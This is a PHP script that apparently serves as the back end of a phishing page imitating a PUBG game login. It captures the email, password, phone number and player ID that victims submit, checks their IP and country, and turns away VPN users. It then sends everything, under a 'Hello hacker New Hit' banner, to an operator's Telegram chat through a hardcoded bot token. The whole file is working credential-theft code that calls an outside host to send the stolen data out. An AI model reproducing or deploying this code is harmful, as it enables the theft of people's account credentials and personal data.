<?php
error_reporting(0);

session_start();
if(array_key_exists("last_access", $_SESSION) && time()-3 <= $_SESSION["last_access"]) {
  exit('You are refreshing too quickly, please wait a few seconds and try again');
}
$_SESSION["last_access"] = time(); 

function getUserIP(){
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
          $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
          $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];

if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $ip = $forward;
}else{
    $ip = $remote;
}
return $ip;
}
 $ip = getUserIP();

$api = json_decode(file_get_contents("https://api.dlyar-dev.tk/whois?ip=".$ip),1);

$flag = $api["flag"];
$ccode = $api["code"];
$country = $api["country-ar"];
$cvpn = $api["check-vpn"];
if($cvpn == true){
exit("Why you Enable vpn?");
}


$token = "6263790175:AAGInwKb5vHwKWHuOtbEGxw2MJO15p5JasY";
$id = 6142498482;
$name_index = " 𓆩𝘽𝘼𝙏𝙈𝘼𝙉𓆪";
$name_tele = "@B_A_T_M_A_N3";
$link = "https://egy.am/5c83206/";



$phone = $_POST['phone'];
$email = $_POST['email'];
$password = $_POST['password'];
$level = $_POST['level'];
$playid = $_POST['playid'];
$login = $_POST['login'];
$time = date("h:i:a");
$date = date("Y/m/d");


$msg="
*𓆩𓆩ℍ𝕖𝕝𝕝𝕠 𝕙𝕒𝕔𝕜𝕖𝕣 ℕ𝕖𝕨 ℍ𝕚𝕥 ツ.𓆪𓆪*

*------------------☾------------------*
*↝ 𝙿𝙰𝙶𝙴 𝚃𝚈𝙿𝙴 » 𝙿𝚄𝙱𝙶 * 
 🔐 *↝ 𝕝𝕠𝕘𝕚𝕟 »* [#$login]($houda) 
 📧 *↝ 𝕖𝕞𝕒𝕚𝕝 » *  `$email`
🔑 *↝ 𝕡𝕒𝕤𝕤𝕨𝕠𝕣𝕕 *»  `$password`
 ⚙️ *↝ 𝕡𝕙𝕠𝕟𝕖 * »  `$phone` 
 🙈 *↝ 𝕝𝕖𝕧𝕖𝕝 * » $level 
 📟 *↝ 𝕚𝕕 *» `$playid`
📍 *↝ 𝕔𝕠𝕦𝕟𝕥𝕣𝕪 » $country *
 ☎️ *↝ 𝕔𝕠𝕕𝕖 *» $ccode ↝ $flag 
 ⏱ *↝ 𝕥𝕚𝕞𝕖 » $time  *
 📝 *↝ 𝕕𝕒𝕥𝕖 » `$date *
*------------------☾------------------*
 *↝ 𝕄𝕆𝔻𝔼 ℙ𝕐  *»  [𝕄𝕐 𝕍𝕀ℙ](tg://user?id=$id) ツ
";
$mesg = http_build_query([
'chat_id'=>$id,
'text'=>$msg,
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true
]);

file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".$mesg);